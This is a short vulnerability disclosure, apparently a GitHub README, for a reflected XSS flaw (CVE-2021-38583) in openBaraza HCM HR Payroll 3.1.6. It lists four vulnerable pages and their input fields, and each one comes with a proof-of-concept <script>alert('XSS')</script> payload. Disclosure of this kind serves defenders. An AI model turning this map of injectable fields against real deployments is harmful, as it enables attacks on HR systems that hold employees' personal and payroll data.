# CVE-2021-38583 openBaraza HCM HR Payroll v.3.1.6 Reflected XSS vulnerability

openBaraza HCM HR Payroll v.3.1.6 does not properly neutralize user-controllable input, which allows reflected cross-site scripting (XSS) vulnerability on multiple pages. 

https://openbaraza.org

https://sourceforge.net/projects/obhrms/?source=directory


### Vulnerable pages:
---

http://serverip:9090/hr/subscription.jsp

affected: "number_of_employees" text box

payload: <script>alert('XSS')</script>

![subscription.jsp](https://raw.githubusercontent.com/charlesbickel/CVE-2021-38583/main/2021-08-11_11-57-29.gif)

---

http://serverip:9090/hr/application.jsp

affected: "surname", "first_name", "middle_name", "applicant_email", "phoneapplicant_phone", "identity_card", "language" text boxes

payload: <script>alert('XSS')</script>

![application.jsp](https://raw.githubusercontent.com/charlesbickel/CVE-2021-38583/main/2021-08-11_11-30-38.gif)

---

http://serverip:9090/hr/index.jsp?view=10:0:0&data=9

affected: "previous_salary", "expected_salary" text boxes

payload: <script>alert('XSS')</script>

![index.jsp?view=10:0:0&data=9](https://raw.githubusercontent.com/charlesbickel/CVE-2021-38583/main/2021-08-10_11-19-01.gif)

---

http://serverip:9090/hr/index.jsp?view=44:0:3&data={new}

affected: "self_rating" text box

payload: <script>alert('XSS')</script>

![index.jsp?view=44:0:3&data={new}](https://raw.githubusercontent.com/charlesbickel/CVE-2021-38583/main/2021-08-12_08-46-01.gif)
